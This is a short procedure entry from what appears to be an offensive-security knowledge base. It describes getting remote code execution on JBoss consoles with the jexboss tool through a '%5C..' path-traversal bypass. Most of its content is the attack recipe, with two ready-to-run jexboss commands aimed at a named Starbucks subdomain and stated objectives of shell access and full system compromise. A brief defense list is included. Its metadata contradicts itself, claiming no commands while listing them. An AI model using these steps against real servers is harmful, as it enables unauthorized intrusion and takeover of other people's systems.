---
id: proc-jexboss-rce-001
tags:
  - rce
  - java-deserialization
  - cve-2007-1036
type: procedure
tools:
  - '[[tools/jexboss]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:24:15.235Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Achieve-RCE-with-Jexboss-Tool

## Summary

Use the jexboss tool to exploit Java deserialization vulnerabilities in the unprotected JBoss console, achieving remote code execution and server takeover.

## Description

Routed through the traversal bypass (/josso/%5C../web-console), jexboss targeted deserialization flaws in JBoss, allowing arbitrary code execution including shell access.

## Requirements

1. Access to JBoss web console
2. Installed jexboss tool
3. Proxy bypass path confirmed

## Defense

- Update JBoss to patched versions
- Disable or secure web consoles
- Implement deserialization filters (e.g., NotSoSerial)

## Objectives

1. Execute arbitrary code on server
2. Gain shell for further actions
3. Compromise full system

## Instructions

### Step 1: Configure Jexboss Target

**Context**: Point to the bypassed console endpoint.

No command; use tool UI or script:

```bash
python jexboss.py -u "http://www.example.starbucks.com.sg/josso/%5C../web-console/ServerInfo.jsp?type=HTTP"
```

> Scans for deserialization vectors.

### Step 2: Trigger Exploitation

**Context**: Run the exploit payload.

```bash
python jexboss.py --exploit -u "http://www.example.starbucks.com.sg/josso/%5C../web-console/ServerInfo.jsp?type=HTTP" -cmd "whoami"
```

> Executes command, returns server user (e.g., tomcat).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- [[tools/jexboss]]

## Tags

- [[rce]]
- [[java-deserialization]]
